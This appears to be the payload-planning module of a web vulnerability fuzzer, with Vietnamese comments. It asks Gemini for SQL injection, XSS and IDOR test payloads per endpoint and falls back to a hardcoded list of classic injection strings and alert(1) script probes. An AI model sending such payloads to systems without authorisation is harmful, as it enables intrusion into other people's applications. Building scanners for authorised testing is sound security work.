# =============================================================================
# fuzzer/payload_planner.py — Sinh payload test cho từng endpoint
#
# Hoạt động:
#   1. Gửi danh sách endpoint cho Gemini
#   2. Gemini trả về payload phù hợp cho từng param
#   3. Nếu Gemini lỗi → dùng payload cứng fallback
#
# Output format:
#   {
#     "ep_001": [
#       {"param": "id", "vuln_type": "sqli", "payloads": ["...", ...]},
#       {"param": "q",  "vuln_type": "xss",  "payloads": ["...", ...]},
#     ]
#   }
# =============================================================================

import json
import logging

from llm.router import call_llm_json

log = logging.getLogger(__name__)

# ─── Payload cứng fallback ────────────────────────────────────────────────────
# Dùng khi Gemini không khả dụng hoặc bị rate limit

DEFAULT_PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "1' AND SLEEP(3)--",
        "' OR 1=1#",
        "admin'--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "<svg onload=alert(1)>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "xss_probe_ws",  # probe text để kiểm tra reflection
    ],
    "idor": [
        "1", "2", "3", "0", "-1", "999999",
    ],
}


def generate_plan(endpoints: list, api_key: str = "") -> dict:
    """
    Sinh payload plan cho toàn bộ endpoint.

    Args:
        endpoints: Danh sách Endpoint (chỉ high/medium mới được plan)
        api_key:   Gemini API key

    Returns:
        dict {endpoint_id: [{param, vuln_type, payloads}]}
    """
    # Chỉ plan cho endpoint có rủi ro
    targets = [ep for ep in endpoints if ep.risk_level in ("high", "medium")]

    if not targets:
        log.warning("[planner] Không có endpoint high/medium nào")
        return {}

    if not api_key:
        log.info("[planner] Không có API key → dùng payload cứng")
        return _default_plan(targets)

    # Chia batch 10 endpoint/lần
    plan = {}
    for i in range(0, len(targets), 10):
        batch      = targets[i:i + 10]
        batch_plan = _gemini_plan(batch, api_key)
        plan.update(batch_plan)

    log.info(f"[planner] Sinh plan cho {len(plan)} endpoints")
    return plan


# ─── Gemini plan ──────────────────────────────────────────────────────────────

def _gemini_plan(batch: list, api_key: str) -> dict:
    """Gửi batch endpoint cho Gemini để sinh payload."""
    ep_list = [
        {
            "id":          ep.id,
            "url":         ep.url,
            "method":      ep.method,
            "params":      ep.params,
            "param_types": ep.param_types,
            "likely_vulns":ep.likely_vulns,
        }
        for ep in batch
    ]

    prompt = f"""Bạn là chuyên gia pentest web. Sinh payload kiểm thử cho các endpoint sau.

Danh sách endpoint:
{json.dumps(ep_list, indent=2, ensure_ascii=False)}

Trả về JSON object (chỉ JSON, không có text thừa):
{{
  "<endpoint_id>": [
    {{
      "param": "<tên param>",
      "vuln_type": "sqli|xss|idor",
      "payloads": ["payload1", "payload2", "payload3"]
    }}
  ]
}}

Quy tắc:
- param kiểu integer → test sqli (error-based) và idor
- param kiểu string  → test xss (reflected)
- Mỗi param sinh 4-6 payload thực tế, không dùng placeholder
- Chỉ test vuln_type trong likely_vulns của endpoint đó"""

    result = call_llm_json(prompt)

    if not result or not isinstance(result, dict):
        log.warning("[planner] Gemini thất bại → fallback")
        return _default_plan(batch)

    return result


# ─── Default plan fallback ────────────────────────────────────────────────────

def _default_plan(endpoints: list) -> dict:
    """Sinh plan từ payload cứng dựa theo likely_vulns của endpoint."""
    plan = {}
    for ep in endpoints:
        items = []
        for param in ep.params:
            ptype = ep.param_types.get(param, "string")
            vulns = ep.likely_vulns or (_guess_vulns(ptype))

            for vuln in vulns:
                if vuln in DEFAULT_PAYLOADS:
                    items.append({
                        "param":     param,
                        "vuln_type": vuln,
                        "payloads":  DEFAULT_PAYLOADS[vuln],
                    })
        if items:
            plan[ep.id] = items
    return plan


def _guess_vulns(param_type: str) -> list[str]:
    """Đoán loại vuln dựa theo kiểu param."""
    if param_type == "integer":
        return ["sqli", "idor"]
    return ["xss"]